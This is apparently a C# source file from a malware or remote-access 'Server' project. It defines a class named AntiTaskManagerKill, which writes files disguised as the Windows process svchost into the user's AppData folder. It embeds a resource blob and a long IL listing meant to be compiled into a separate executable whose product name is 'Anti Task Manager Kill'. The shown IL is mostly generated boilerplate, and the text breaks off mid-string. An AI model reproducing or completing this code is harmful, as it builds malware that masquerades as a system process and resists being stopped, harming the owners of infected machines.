#region "Imports"
using MessageCustomHandler;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
#endregion

namespace Server
{
    class AntiTaskManagerKill
    {
        #region "Variables"
        private static readonly string newLine = Environment.NewLine;

        private readonly string ProcessName = "";
        private readonly string FilePathIL = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\svchost.il";
        private readonly string FilePathEXE = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\svchost.exe";
        private readonly string FileResourcePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\svchost.Resources.resources";
        private readonly string FileResource = "zsrvvgEAAACRAAAAbFN5c3RlbS5SZXNvdXJjZXMuUmVzb3VyY2VSZWFkZXIsIG1zY29ybGliLCBWZXJzaW9uPTIuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSNTeXN0ZW0uUmVzb3VyY2VzLlJ1bnRpbWVSZXNvdXJjZVNldAIAAAAAAAAAAAAAAFBBRFBBRFC0AAAA";
        
        private readonly string KIL = newLine +
@"//  Microsoft (R) .NET Framework IL Disassembler.  Version 3.5.30729.1" + newLine +
@"//  Copyright (c) Microsoft Corporation.  All rights reserved." + newLine +
@"//  Product : Anti Task Manager Kill" + newLine +
@"//  Coder   : " + newLine +
@"//  Date    : 0-0-1970" + newLine +
@"// Metadata version: v2.0.50727" + newLine +
@".assembly extern mscorlib" + newLine +
@"{" + newLine +
@"  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4.." + newLine +
@"  .ver 2:0:0:0" + newLine +
@"}" + newLine +
@".assembly extern Microsoft.VisualBasic" + newLine +
@"{" + newLine +
@"  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:" + newLine +
@"  .ver 8:0:0:0" + newLine +
@"}" + newLine +
@".assembly extern System" + newLine +
@"{" + newLine +
@"  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4.." + newLine +
@"  .ver 2:0:0:0" + newLine +
@"}" + newLine +
@".assembly svchost" + newLine +
@"{" + newLine +
@"  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 12 43 6F 70 79 72 69 67 68 74 20 C2 A9 20   // ...Copyright .. " + newLine +
@"                                                                                                  20 32 30 31 34 00 00 )                            //  2014.." + newLine +
@"  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) " + newLine +
@"  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 07 73 76 63 68 6F 73 74 00 00 )             // ...svchost.." + newLine +
@"  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) " + newLine +
@"  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 07 73 76 63 68 6F 73 74 00 00 )             // ...svchost.." + newLine +
@"  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) " + newLine +
@"" + newLine +
@"  // --- The following custom attribute is added automatically, do not uncomment -------" + newLine +
@"  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) " + newLine +
@"" + newLine +
@"  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) " + newLine +
@"  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx" + newLine +
@"                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows." + newLine +
@"  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0.." + newLine +
@"  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 36 31 31 30 36 39 32 65 2D 66 35 33 32   // ..$6110692e-f532" + newLine +
@"                                                                                                  2D 34 63 36 39 2D 38 37 35 31 2D 32 37 66 39 62   // -4c69-8751-27f9b" + newLine +
@"                                                                                                  34 64 33 66 61 36 65 00 00 )                      // 4d3fa6e.." + newLine +
@"  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) " + newLine +
@"  .hash algorithm 0x00008004" + newLine +
@"  .ver 1:0:0:0" + newLine +
@"}" + newLine +
@".mresource public svchost.Resources.resources" + newLine +
@"{" + newLine +
@"  // Offset: 0x00000000 Length: 0x000000B4" + newLine +
@"  // WARNING: managed resource file svchost.Resources.resources created" + newLine +
@"}" + newLine +
@".module svchost.exe" + newLine +
@"// MVID: {3AB35FB3-B070-4CFC-80F8-733CE6E8517C}" + newLine +
@".imagebase 0x00400000" + newLine +
@".file alignment 0x00000200" + newLine +
@".stackreserve 0x00100000" + newLine +
@".subsystem 0x0002       // WINDOWS_GUI" + newLine +
@".corflags 0x00000001    //  ILONLY" + newLine +
@"// Image base: 0x02640000" + newLine +
@"" + newLine +
@"" + newLine +
@"// =============== CLASS MEMBERS DECLARATION ===================" + newLine +
@"" + newLine +
@".class private auto ansi svchost.My.MyApplication" + newLine +
@"       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase" + newLine +
@"{" + newLine +
@"  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string," + newLine +
@"                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8." + newLine +
@"                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0.." + newLine +
@"  .method public specialname rtspecialname " + newLine +
@"          instance void  .ctor() cil managed" + newLine +
@"  {" + newLine +
@"    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    // Code size       9 (0x9)" + newLine +
@"    .maxstack  8" + newLine +
@"    IL_0000:  ldarg.0" + newLine +
@"    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase::.ctor()" + newLine +
@"    IL_0006:  nop" + newLine +
@"    IL_0007:  nop" + newLine +
@"    IL_0008:  ret" + newLine +
@"  } // end of method MyApplication::.ctor" + newLine +
@"" + newLine +
@"} // end of class svchost.My.MyApplication" + newLine +
@"" + newLine +
@".class private auto ansi svchost.My.MyComputer" + newLine +
@"       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer" + newLine +
@"{" + newLine +
@"  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string," + newLine +
@"                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8." + newLine +
@"                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0.." + newLine +
@"  .method public specialname rtspecialname " + newLine +
@"          instance void  .ctor() cil managed" + newLine +
@"  {" + newLine +
@"    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"    // Code size       10 (0xa)" + newLine +
@"    .maxstack  8" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  ldarg.0" + newLine +
@"    IL_0002:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()" + newLine +
@"    IL_0007:  nop" + newLine +
@"    IL_0008:  nop" + newLine +
@"    IL_0009:  ret" + newLine +
@"  } // end of method MyComputer::.ctor" + newLine +
@"" + newLine +
@"} // end of class svchost.My.MyComputer" + newLine +
@"" + newLine +
@".class private auto ansi sealed beforefieldinit svchost.My.MyProject" + newLine +
@"       extends [mscorlib]System.Object" + newLine +
@"{" + newLine +
@"  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string," + newLine +
@"                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8." + newLine +
@"                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0.." + newLine +
@"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .class auto ansi sealed nested assembly MyWebServices" + newLine +
@"         extends [mscorlib]System.Object" + newLine +
@"  {" + newLine +
@"    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string," + newLine +
@"                                                                                                         string," + newLine +
@"                                                                                                         string," + newLine +
@"                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se" + newLine +
@"                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols" + newLine +
@"                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP" + newLine +
@"                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__" + newLine +
@"                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo" + newLine +
@"                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__.." + newLine +
@"                                                                                                                     00 ) " + newLine +
@"    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"    .method public strict virtual instance bool " + newLine +
@"            Equals(object o) cil managed" + newLine +
@"    {" + newLine +
@"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"      // Code size       18 (0x12)" + newLine +
@"      .maxstack  2" + newLine +
@"      .locals init (bool V_0)" + newLine +
@"      IL_0000:  nop" + newLine +
@"      IL_0001:  ldarg.0" + newLine +
@"      IL_0002:  ldarg.1" + newLine +
@"      IL_0003:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)" + newLine +
@"      IL_0008:  call       instance bool [mscorlib]System.Object::Equals(object)" + newLine +
@"      IL_000d:  stloc.0" + newLine +
@"      IL_000e:  br.s       IL_0010" + newLine +
@"" + newLine +
@"      IL_0010:  ldloc.0" + newLine +
@"      IL_0011:  ret" + newLine +
@"    } // end of method MyWebServices::Equals" + newLine +
@"" + newLine +
@"    .method public strict virtual instance int32 " + newLine +
@"            GetHashCode() cil managed" + newLine +
@"    {" + newLine +
@"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"      // Code size       12 (0xc)" + newLine +
@"      .maxstack  1" + newLine +
@"      .locals init (int32 V_0)" + newLine +
@"      IL_0000:  nop" + newLine +
@"      IL_0001:  ldarg.0" + newLine +
@"      IL_0002:  call       instance int32 [mscorlib]System.Object::GetHashCode()" + newLine +
@"      IL_0007:  stloc.0" + newLine +
@"      IL_0008:  br.s       IL_000a" + newLine +
@"" + newLine +
@"      IL_000a:  ldloc.0" + newLine +
@"      IL_000b:  ret" + newLine +
@"    } // end of method MyWebServices::GetHashCode" + newLine +
@"" + newLine +
@"    .method assembly hidebysig instance class [mscorlib]System.Type " + newLine +
@"            GetType() cil managed" + newLine +
@"    {" + newLine +
@"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"      // Code size       16 (0x10)" + newLine +
@"      .maxstack  1" + newLine +
@"      .locals init (class [mscorlib]System.Type V_0)" + newLine +
@"      IL_0000:  nop" + newLine +
@"      IL_0001:  ldtoken    svchost.My.MyProject/MyWebServices" + newLine +
@"      IL_0006:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)" + newLine +
@"      IL_000b:  stloc.0" + newLine +
@"      IL_000c:  br.s       IL_000e" + newLine +
@"" + newLine +
@"      IL_000e:  ldloc.0" + newLine +
@"      IL_000f:  ret" + newLine +
@"    } // end of method MyWebServices::GetType" + newLine +
@"" + newLine +
@"    .method public strict virtual instance string " + newLine +
@"            ToString() cil managed" + newLine +
@"    {" + newLine +
@"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"      // Code size       12 (0xc)" + newLine +
@"      .maxstack  1" + newLine +
@"      .locals init (string V_0)" + newLine +
@"      IL_0000:  nop" + newLine +
@"      IL_0001:  ldarg.0" + newLine +
@"      IL_0002:  call       instance string [mscorlib]System.Object::ToString()" + newLine +
@"      IL_0007:  stloc.0" + newLine +
@"      IL_0008:  br.s       IL_000a" + newLine +
@"" + newLine +
@"      IL_000a:  ldloc.0" + newLine +
@"      IL_000b:  ret" + newLine +
@"    } // end of method MyWebServices::ToString" + newLine +
@"" + newLine +
@"    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed" + newLine +
@"    {" + newLine +
@"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"      // Code size       32 (0x20)" + newLine +
@"      .maxstack  2" + newLine +
@"      .locals init (!!T V_0," + newLine +
@"               bool V_1)" + newLine +
@"      IL_0000:  nop" + newLine +
@"      IL_0001:  ldarg.0" + newLine +
@"      IL_0002:  box        !!T" + newLine +
@"      IL_0007:  ldnull" + newLine +
@"      IL_0008:  ceq" + newLine +
@"      IL_000a:  stloc.1" + newLine +
@"      IL_000b:  ldloc.1" + newLine +
@"      IL_000c:  brfalse.s  IL_0018" + newLine +
@"" + newLine +
@"      IL_000e:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()" + newLine +
@"      IL_0013:  stloc.0" + newLine +
@"      IL_0014:  br.s       IL_001e" + newLine +
@"" + newLine +
@"      IL_0016:  br.s       IL_001d" + newLine +
@"" + newLine +
@"      IL_0018:  nop" + newLine +
@"      IL_0019:  ldarg.0" + newLine +
@"      IL_001a:  stloc.0" + newLine +
@"      IL_001b:  br.s       IL_001e" + newLine +
@"" + newLine +
@"      IL_001d:  nop" + newLine +
@"      IL_001e:  ldloc.0" + newLine +
@"      IL_001f:  ret" + newLine +
@"    } // end of method MyWebServices::Create__Instance__" + newLine +
@"" + newLine +
@"    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed" + newLine +
@"    {" + newLine +
@"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"      // Code size       18 (0x12)" + newLine +
@"      .maxstack  2" + newLine +
@"      .locals init (!!T V_0)" + newLine +
@"      IL_0000:  nop" + newLine +
@"      IL_0001:  ldarg.1" + newLine +
@"      IL_0002:  ldloca.s   V_0" + newLine +
@"      IL_0004:  initobj    !!T" + newLine +
@"      IL_000a:  ldloc.0" + newLine +
@"      IL_000b:  stobj      !!T" + newLine +
@"      IL_0010:  nop" + newLine +
@"      IL_0011:  ret" + newLine +
@"    } // end of method MyWebServices::Dispose__Instance__" + newLine +
@"" + newLine +
@"    .method public specialname rtspecialname " + newLine +
@"            instance void  .ctor() cil managed" + newLine +
@"    {" + newLine +
@"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"      // Code size       10 (0xa)" + newLine +
@"      .maxstack  8" + newLine +
@"      IL_0000:  nop" + newLine +
@"      IL_0001:  ldarg.0" + newLine +
@"      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()" + newLine +
@"      IL_0007:  nop" + newLine +
@"      IL_0008:  nop" + newLine +
@"      IL_0009:  ret" + newLine +
@"    } // end of method MyWebServices::.ctor" + newLine +
@"" + newLine +
@"  } // end of class MyWebServices" + newLine +
@"" + newLine +
@"  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>" + newLine +
@"         extends [mscorlib]System.Object" + newLine +
@"  {" + newLine +
@"    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) " + newLine +
@"    .field private static !T m_ThreadStaticValue" + newLine +
@"    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    .method assembly specialname instance !T " + newLine +
@"            get_GetInstance() cil managed" + newLine +
@"    {" + newLine +
@"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"      // Code size       38 (0x26)" + newLine +
@"      .maxstack  2" + newLine +
@"      .locals init (!T V_0," + newLine +
@"               bool V_1)" + newLine +
@"      IL_0000:  nop" + newLine +
@"      IL_0001:  ldsfld     !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue" + newLine +
@"      IL_0006:  box        !T" + newLine +
@"      IL_000b:  ldnull" + newLine +
@"      IL_000c:  ceq" + newLine +
@"      IL_000e:  stloc.1" + newLine +
@"      IL_000f:  ldloc.1" + newLine +
@"      IL_0010:  brfalse.s  IL_001c" + newLine +
@"" + newLine +
@"      IL_0012:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()" + newLine +
@"      IL_0017:  stsfld     !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue" + newLine +
@"      IL_001c:  ldsfld     !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue" + newLine +
@"      IL_0021:  stloc.0" + newLine +
@"      IL_0022:  br.s       IL_0024" + newLine +
@"" + newLine +
@"      IL_0024:  ldloc.0" + newLine +
@"      IL_0025:  ret" + newLine +
@"    } // end of method ThreadSafeObjectProvider`1::get_GetInstance" + newLine +
@"" + newLine +
@"    .method public specialname rtspecialname " + newLine +
@"            instance void  .ctor() cil managed" + newLine +
@"    {" + newLine +
@"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) " + newLine +
@"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"      // Code size       10 (0xa)" + newLine +
@"      .maxstack  8" + newLine +
@"      IL_0000:  nop" + newLine +
@"      IL_0001:  ldarg.0" + newLine +
@"      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()" + newLine +
@"      IL_0007:  nop" + newLine +
@"      IL_0008:  nop" + newLine +
@"      IL_0009:  ret" + newLine +
@"    } // end of method ThreadSafeObjectProvider`1::.ctor" + newLine +
@"" + newLine +
@"    .property instance !T GetInstance()" + newLine +
@"    {" + newLine +
@"      .get instance !T svchost.My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()" + newLine +
@"    } // end of property ThreadSafeObjectProvider`1::GetInstance" + newLine +
@"  } // end of class ThreadSafeObjectProvider`1" + newLine +
@"" + newLine +
@"  .field private static initonly class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyComputer> m_ComputerObjectProvider" + newLine +
@"  .field private static initonly class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyApplication> m_AppObjectProvider" + newLine +
@"  .field private static initonly class svchost.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider" + newLine +
@"  .field private static initonly class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyProject/MyWebServices> m_MyWebServicesObjectProvider" + newLine +
@"  .method private specialname rtspecialname static " + newLine +
@"          void  .cctor() cil managed" + newLine +
@"  {" + newLine +
@"    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    // Code size       42 (0x2a)" + newLine +
@"    .maxstack  8" + newLine +
@"    IL_0000:  newobj     instance void class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyComputer>::.ctor()" + newLine +
@"    IL_0005:  stsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyComputer> svchost.My.MyProject::m_ComputerObjectProvider" + newLine +
@"    IL_000a:  newobj     instance void class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyApplication>::.ctor()" + newLine +
@"    IL_000f:  stsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyApplication> svchost.My.MyProject::m_AppObjectProvider" + newLine +
@"    IL_0014:  newobj     instance void class svchost.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()" + newLine +
@"    IL_0019:  stsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> svchost.My.MyProject::m_UserObjectProvider" + newLine +
@"    IL_001e:  newobj     instance void class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyProject/MyWebServices>::.ctor()" + newLine +
@"    IL_0023:  stsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyProject/MyWebServices> svchost.My.MyProject::m_MyWebServicesObjectProvider" + newLine +
@"    IL_0028:  nop" + newLine +
@"    IL_0029:  ret" + newLine +
@"  } // end of method MyProject::.cctor" + newLine +
@"" + newLine +
@"  .method assembly specialname static class svchost.My.MyComputer " + newLine +
@"          get_Computer() cil managed" + newLine +
@"  {" + newLine +
@"    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    // Code size       16 (0x10)" + newLine +
@"    .maxstack  1" + newLine +
@"    .locals init (class svchost.My.MyComputer V_0)" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  ldsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyComputer> svchost.My.MyProject::m_ComputerObjectProvider" + newLine +
@"    IL_0006:  callvirt   instance !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyComputer>::get_GetInstance()" + newLine +
@"    IL_000b:  stloc.0" + newLine +
@"    IL_000c:  br.s       IL_000e" + newLine +
@"" + newLine +
@"    IL_000e:  ldloc.0" + newLine +
@"    IL_000f:  ret" + newLine +
@"  } // end of method MyProject::get_Computer" + newLine +
@"" + newLine +
@"  .method assembly specialname static class svchost.My.MyApplication " + newLine +
@"          get_Application() cil managed" + newLine +
@"  {" + newLine +
@"    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    // Code size       16 (0x10)" + newLine +
@"    .maxstack  1" + newLine +
@"    .locals init (class svchost.My.MyApplication V_0)" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  ldsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyApplication> svchost.My.MyProject::m_AppObjectProvider" + newLine +
@"    IL_0006:  callvirt   instance !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyApplication>::get_GetInstance()" + newLine +
@"    IL_000b:  stloc.0" + newLine +
@"    IL_000c:  br.s       IL_000e" + newLine +
@"" + newLine +
@"    IL_000e:  ldloc.0" + newLine +
@"    IL_000f:  ret" + newLine +
@"  } // end of method MyProject::get_Application" + newLine +
@"" + newLine +
@"  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User " + newLine +
@"          get_User() cil managed" + newLine +
@"  {" + newLine +
@"    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    // Code size       16 (0x10)" + newLine +
@"    .maxstack  1" + newLine +
@"    .locals init (class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User V_0)" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  ldsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> svchost.My.MyProject::m_UserObjectProvider" + newLine +
@"    IL_0006:  callvirt   instance !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()" + newLine +
@"    IL_000b:  stloc.0" + newLine +
@"    IL_000c:  br.s       IL_000e" + newLine +
@"" + newLine +
@"    IL_000e:  ldloc.0" + newLine +
@"    IL_000f:  ret" + newLine +
@"  } // end of method MyProject::get_User" + newLine +
@"" + newLine +
@"  .method assembly specialname static class svchost.My.MyProject/MyWebServices " + newLine +
@"          get_WebServices() cil managed" + newLine +
@"  {" + newLine +
@"    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    // Code size       16 (0x10)" + newLine +
@"    .maxstack  1" + newLine +
@"    .locals init (class svchost.My.MyProject/MyWebServices V_0)" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  ldsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyProject/MyWebServices> svchost.My.MyProject::m_MyWebServicesObjectProvider" + newLine +
@"    IL_0006:  callvirt   instance !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyProject/MyWebServices>::get_GetInstance()" + newLine +
@"    IL_000b:  stloc.0" + newLine +
@"    IL_000c:  br.s       IL_000e" + newLine +
@"" + newLine +
@"    IL_000e:  ldloc.0" + newLine +
@"    IL_000f:  ret" + newLine +
@"  } // end of method MyProject::get_WebServices" + newLine +
@"" + newLine +
@"  .property class svchost.My.MyComputer Computer()" + newLine +
@"  {" + newLine +
@"    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer.." + newLine +
@"    .get class svchost.My.MyComputer svchost.My.MyProject::get_Computer()" + newLine +
@"  } // end of property MyProject::Computer" + newLine +
@"  .property class svchost.My.MyApplication" + newLine +
@"          Application()" + newLine +
@"  {" + newLine +
@"    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio" + newLine +
@"                                                                                                       6E 00 00 )                                        // n.." + newLine +
@"    .get class svchost.My.MyApplication svchost.My.MyProject::get_Application()" + newLine +
@"  } // end of property MyProject::Application" + newLine +
@"  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User" + newLine +
@"          User()" + newLine +
@"  {" + newLine +
@"    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User.." + newLine +
@"    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User svchost.My.MyProject::get_User()" + newLine +
@"  } // end of property MyProject::User" + newLine +
@"  .property class svchost.My.MyProject/MyWebServices" + newLine +
@"          WebServices()" + newLine +
